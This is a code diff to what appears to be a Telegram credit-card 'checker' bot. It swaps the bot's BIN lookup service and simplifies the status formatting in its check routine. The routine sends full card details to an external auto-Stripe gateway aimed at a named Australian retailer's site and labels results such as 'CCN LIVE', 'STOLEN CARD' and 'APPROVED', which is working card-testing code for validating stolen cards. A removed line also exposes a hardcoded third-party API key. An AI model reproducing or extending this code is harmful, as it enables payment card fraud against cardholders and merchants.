@@ -1502,9 +1502,10 @@ def escape_markdown_v2(text: str) -> str:
         return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))
 
 # ✅ Async BIN Lookup (antipublic.cc)
+# ===== BIN LOOKUP FUNCTION =====
 async def get_bin_details(bin_number: str) -> dict:
     """
-    Fetch BIN details from bintable API with fallback defaults.
+    Fetch BIN details from new BIN API (binlist) with fallback defaults.
     """
     bin_data = {
         "scheme": "N/A",
@@ -1517,13 +1518,10 @@ async def get_bin_details(bin_number: str) -> dict:
         "card_type": "N/A"
     }
 
-    url = f"https://api.bintable.com/v1/{bin_number}?api_key=a48d5b84128681e7b724ed6cb4b6420582847c69"
+    url = f"https://lookup.binlist.net/{bin_number}"
     headers = {
-        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
-        "Accept": "application/json, text/plain, */*",
-        "Origin": "https://bintable.com",
-        "Referer": "https://bintable.com/",
-        "Connection": "keep-alive"
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "application/json"
     }
 
     try:
@@ -1532,21 +1530,20 @@ async def get_bin_details(bin_number: str) -> dict:
                 if response.status == 200:
                     try:
                         data = await response.json(content_type=None)
-                        if data.get("result") == 200 and "data" in data:
-                            card = data["data"].get("card", {})
-                            country = data["data"].get("country", {})
-                            bank = data["data"].get("bank", {})
 
-                            bin_data["scheme"] = str(card.get("scheme", "N/A")).title()
-                            bin_data["type"] = str(card.get("type", "N/A")).title()
-                            bin_data["card_type"] = str(card.get("type", "N/A")).title()
-                            bin_data["level"] = str(card.get("category", "N/A")).title()
-                            bin_data["bank"] = str(bank.get("name", "N/A")).title()
-                            bin_data["country_name"] = country.get("name", "N/A")
-                            bin_data["country_emoji"] = country.get("flag", "")
-                            return bin_data
-                        else:
-                            logger.warning(f"BIN API JSON missing data for BIN {bin_number}: {data}")
+                        bin_data["scheme"] = str(data.get("scheme", "N/A")).title()
+                        bin_data["type"] = str(data.get("type", "N/A")).title()
+                        bin_data["card_type"] = str(data.get("brand", "N/A")).title()
+                        bin_data["level"] = str(data.get("brand", "N/A")).title()
+
+                        bank = data.get("bank", {})
+                        country = data.get("country", {})
+
+                        bin_data["bank"] = str(bank.get("name", "N/A")).title()
+                        bin_data["country_name"] = country.get("name", "N/A")
+                        bin_data["country_emoji"] = country.get("emoji", "")
+
+                        return bin_data
                     except Exception as e:
                         logger.warning(f"JSON parse error for BIN {bin_number}: {e}")
                 else:
@@ -1557,11 +1554,13 @@ async def get_bin_details(bin_number: str) -> dict:
     return bin_data
 
 
-# ✅ Background check now uses live BIN data
+# ===== BACKGROUND CHECK =====
 async def background_check(cc_normalized, parts, user, user_data, processing_msg):
     bullet_text = escape_markdown_v2("[⌇]")
     bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
+
     try:
+        # BIN lookup
         bin_number = parts[0][:6]
         bin_details = await get_bin_details(bin_number)
 
@@ -1570,48 +1569,44 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         country_name = (bin_details.get("country_name") or "N/A")
         country_flag = bin_details.get("country_emoji", "")
 
-        # Your main API call
+        # Call your main API
         api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=45) as resp:
                 if resp.status != 200:
                     raise Exception(f"HTTP {resp.status}")
                 data = await resp.json()
+
         api_status = (data.get("status") or "Unknown").strip()
 
-        # Status formatting with safe try/except
-        try:
+        # Status formatting
+        lower_status = api_status.lower()
+        if "approved" in lower_status:
+            status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
+        elif "declined" in lower_status:
+            status_text = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
+        elif "ccn live" in lower_status:
+            status_text = "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
+        elif "incorrect" in lower_status or "your number" in lower_status:
+            status_text = "❌ 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 ❌"
+        elif "3ds" in lower_status or "auth required" in lower_status:
+            status_text = "🔒 3𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 🔒"
+        elif "insufficient funds" in lower_status:
+            status_text = "💸 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 💸"
+        elif "expired" in lower_status:
+            status_text = "⌛ 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ⌛"
+        elif "stolen" in lower_status:
+            status_text = "🚫 𝗦𝗧𝗢𝗟𝗘𝗡 𝗖𝗔𝗥𝗗 🚫"
+        elif "pickup card" in lower_status:
+            status_text = "🛑 𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 🛑"
+        elif "fraudulent" in lower_status:
+            status_text = "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
+        elif "generic decline" in lower_status:
+            status_text = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
+        else:
             status_text = api_status.upper()
-            lower_status = api_status.lower()
-            if "approved" in lower_status:
-                status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
-            elif "declined" in lower_status:
-                status_text = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
-            elif "ccn live" in lower_status:
-                status_text = "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘 ❎"
-            elif "incorrect" in lower_status or "your number" in lower_status:
-                status_text = "❌ 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 ❌"
-            elif "3ds" in lower_status or "auth required" in lower_status:
-                status_text = "🔒 3𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 🔒"
-            elif "insufficient funds" in lower_status:
-                status_text = "💸 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦 💸"
-            elif "expired" in lower_status:
-                status_text = "⌛ 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ⌛"
-            elif "stolen" in lower_status:
-                status_text = "🚫 𝗦𝗧𝗢𝗟𝗘𝗡 𝗖𝗔𝗥𝗗 🚫"
-            elif "pickup card" in lower_status:
-                status_text = "🛑 𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 🛑"
-            elif "fraudulent" in lower_status:
-                status_text = "⚠️ 𝗙𝗥𝗔𝗨𝗗 𝗖𝗔𝗥𝗗 ⚠️"
-            elif "generic decline" in lower_status:
-                status_text = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
-            else:
-                status_text = api_status.upper()  # fallback
-        except Exception as e:
-            status_text = "❌ ERROR ❌"
-            print(f"Status formatting error: {e}")
 
-        # Prepare header and italic API status
+        # Header + response formatting
         header = f"═══\\[ **{escape_markdown_v2(status_text)}** \\]═══"
         formatted_response = f"_{escape_markdown_v2(api_status)}_"
 
@@ -1631,23 +1626,18 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             f"――――――――――――――――"
         )
 
-        # Send the message with MarkdownV2
-        try:
-            await processing_msg.edit_text(
-                final_text,
-                parse_mode=ParseMode.MARKDOWN_V2,
-                disable_web_page_preview=True
-            )
-        except Exception as e:
-            await processing_msg.edit_text(
-                f"❌ API Error: {escape_markdown_v2(str(e))}",
-                parse_mode=ParseMode.MARKDOWN_V2,
-                disable_web_page_preview=True
-            )
+        # Send final message
+        await processing_msg.edit_text(
+            final_text,
+            parse_mode=ParseMode.MARKDOWN_V2,
+            disable_web_page_preview=True
+        )
+
     except Exception as e:
         await processing_msg.edit_text(
-            f"❌ An error occurred during the check: {escape_markdown_v2(str(e))}",
-            parse_mode=ParseMode.MARKDOWN_V2
+            f"❌ An error occurred: {escape_markdown_v2(str(e))}",
+            parse_mode=ParseMode.MARKDOWN_V2,
+            disable_web_page_preview=True
         )
 
 
